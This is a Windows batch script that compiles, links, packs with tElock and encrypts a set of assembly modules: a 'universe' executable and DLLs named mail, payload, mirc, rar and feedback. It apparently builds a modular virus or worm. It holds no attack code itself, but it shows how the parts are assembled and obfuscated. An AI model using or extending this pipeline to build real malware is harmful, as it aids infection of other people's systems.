@echo off

set tasm=Z:\programs\development\rce\assemblers\tasm
set tasm_bin=%tasm%\bin
set path=%path%%cd%\utils
cd utils
%tasm_bin%\tasm32 /ml /m9 /q cryptkey
%tasm_bin%\tasm32 /ml /m9 /q bin2inc
%tasm_bin%\tlink32 -Tpe -c -x -aa cryptkey,,,%tasm%\lib\import32,..\universe
%tasm_bin%\tlink32 -Tpe -c -x -aa bin2inc,,,%tasm%\lib\import32
del cryptkey.obj
del bin2inc.obj
pewrsec cryptkey.exe
pewrsec bin2inc.exe
cryptkey.exe

bin2inc crypt.key
move output.inc ..\key.inc
bin2inc crypt_pp.key
move output.inc ..\key_pp.inc

cd ..
%tasm_bin%\tasm32 /ml /m9 /q universe
%tasm_bin%\tlink32 -Tpe -c -x -aa universe,,,%tasm%\lib\import32,universe,universe
del universe.obj
pewrsec universe.exe

cd dll
%tasm_bin%\tasm32 /ml /m9 /q mail
%tasm_bin%\tasm32 /ml /m9 /q payload
%tasm_bin%\tasm32 /ml /m9 /q feedback
%tasm_bin%\tasm32 /ml /m9 /q mirc
%tasm_bin%\tasm32 /ml /m9 /q rar
%tasm_bin%\tlink32 -Tpd -c -x -aa mail,,,%tasm%\lib\import32,dllz
%tasm_bin%\tlink32 -Tpd -c -x -aa payload,,,%tasm%\lib\import32,dllz
%tasm_bin%\tlink32 -Tpd -c -x -aa feedback,,,%tasm%\lib\import32,dllz
%tasm_bin%\tlink32 -Tpd -c -x -aa mirc,,,%tasm%\lib\import32,dllz
%tasm_bin%\tlink32 -Tpd -c -x -aa rar,,,%tasm%\lib\import32,dllz
del mail.obj
del payload.obj
del feedback.obj
del mirc.obj
del rar.obj

pewrsec mail.dll
pewrsec payload.dll
pewrsec feedback.dll
pewrsec mirc.dll
pewrsec rar.dll

cd ..\utils
%tasm_bin%\tasm32 /ml /m9 /q encr
%tasm_bin%\tlink32 -Tpe -c -x -aa encr,,,%tasm%\lib\import32,..\universe
del encr.obj
pewrsec encr.exe

telock51\telock51.exe
encr.exe ..\dll\mail.dll
encr.exe ..\dll\payload.dll
encr.exe ..\dll\feedback.dll
encr.exe ..\dll\mirc.dll
encr.exe ..\dll\rar.dll
pause>nul